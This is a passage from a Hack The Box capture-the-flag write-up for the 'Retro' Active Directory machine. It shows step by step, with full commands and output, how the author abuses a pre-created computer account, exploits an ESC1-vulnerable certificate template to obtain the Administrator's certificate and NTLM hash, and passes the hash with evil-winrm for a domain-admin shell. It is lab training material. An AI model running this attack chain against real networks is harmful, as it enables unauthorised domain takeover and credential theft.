+smb: \&gt; </code></pre><p>Looks like ive found the user flag and also a another file which could be interesting</p><h2><code>ToDo.txt</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+
+Best
+
+James</code></pre><p>Looks like they are hinting at pre created computer accounts, im going to take a guess its referring to <code>BANKING$</code></p><h2>Compromising <code>BANKING$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap DC.retro.vl -u trainee -p &#39;trainee&#39; -M pre2k               
+LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.44   389    DC               [+] retro.vl\trainee:trainee 
+PRE2K       10.129.234.44   389    DC               Pre-created computer account: BANKING$
+PRE2K       10.129.234.44   389    DC               [+] Found 1 pre-created computer accounts. Saved to /home/ethan/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
+PRE2K       10.129.234.44   389    DC               [+] Successfully obtained TGT for banking@retro.vl
+PRE2K       10.129.234.44   389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /home/ethan/.nxc/modules/pre2k/ccache</code></pre><p>So ive identified the computer account, and its also saved a ccache for me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">mv /home/ethan/.nxc/modules/pre2k/ccache .
+
+export KRB5CCNAME=ccache/banking.ccache</code></pre><p>Now i can use this ticket to authenticate</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.retro.vl -k --use-kcache                  
+SMB         DC.retro.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         DC.retro.vl     445    DC               [+] RETRO.VL\banking from ccache</code></pre><p>Here i am verifying access This user has no extra access over SMB</p><h2>ADCS exploitation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -k -no-pass -dc-ip 10.129.234.44 -dc-host DC.retro.vl -vulnerable
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;retro-DC-CA&#39; via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &#39;retro-DC-CA&#39;
+[*] Checking web enrollment for CA &#39;retro-DC-CA&#39; @ &#39;DC.retro.vl&#39;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to &#39;20260307234013_Certipy.txt&#39;
+[*] Wrote text output to &#39;20260307234013_Certipy.txt&#39;
+[*] Saving JSON output to &#39;20260307234013_Certipy.json&#39;
+[*] Wrote JSON output to &#39;20260307234013_Certipy.json&#39;</code></pre><p>Now ill cat out the response</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat 20260307234013_Certipy.txt                                                   
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : RETRO.VL\Administrators
+      Access Rights
+        ManageCa                        : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        ManageCertificates              : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Enroll                          : RETRO.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2023-07-23T21:17:47+00:00
+    Template Last Modified              : 2023-07-23T21:18:39+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Full Control Principals         : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Property Enroll           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</code></pre><p>As seen here this is vulnerable to ESC1</p><h3>ESC1</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad account -k -no-pass -dc-ip 10.129.234.44 -dc-host DC.retro.vl -user &#39;Administrator&#39; read
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Reading attributes for &#39;Administrator&#39;:
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl
+    name                                : Administrator
+    objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2023-07-23T21:07:55+00:00
+    whenChanged                         : 2025-05-05T07:11:09+00:00</code></pre><p>I first of all run this command to get the Admins SID</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -k -no-pass -dc-ip 10.129.234.44 -target &#39;DC.retro.vl&#39; -dc-host &#39;DC.retro.vl&#39; -ca &#39;retro-DC-CA&#39; -template &#39;RetroClients&#39; -upn &#39;Administrator@retro.vl&#39; -sid &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39; -key-size 4096 -debug
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Domain retrieved from CCache: RETRO.VL
+[+] Username retrieved from CCache: banking
+[+] Nameserver: &#39;10.129.234.44&#39;
+[+] DC IP: &#39;10.129.234.44&#39;
+[+] DC Host: &#39;DC.retro.vl&#39;
+[+] Target IP: None
+[+] Remote Name: &#39;DC.retro.vl&#39;
+[+] Domain: &#39;RETRO.VL&#39;
+[+] Username: &#39;BANKING&#39;
+[+] Trying to resolve &#39;DC.retro.vl&#39; at &#39;10.129.234.44&#39;
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Checking for Kerberos ticket cache
+[+] Loaded Kerberos cache from ccache/banking.ccache
+[+] Using TGT from cache
+[+] Username retrieved from CCache credential: banking
+[+] Getting TGS for &#39;HOST/DC.retro.vl&#39;
+[+] Got TGS for &#39;HOST/DC.retro.vl&#39;
+[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;Administrator@retro.vl&#39;
+[+] Found SID in SAN URL: &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+[+] Found SID in security extension: &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+[*] Certificate object SID is &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[+] Attempting to write data to &#39;administrator.pfx&#39;
+[+] Data written to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre><p>I now have the administrators pfx file</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44                                        
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;Administrator@retro.vl&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+[*] Using principal: &#39;administrator@retro.vl&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@retro.vl&#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</code></pre><p>I now have the admins NTLM hash</p><h2>Domain admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i retro.vl -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>As seen from this output i was able to get a session and retrieve the root flag</p><p>Full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-escape/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Escape</span></a><a class="action secondary writeup-nav-button" href="/writeups/thm/blue/thm-lockdown/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Lockdown</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
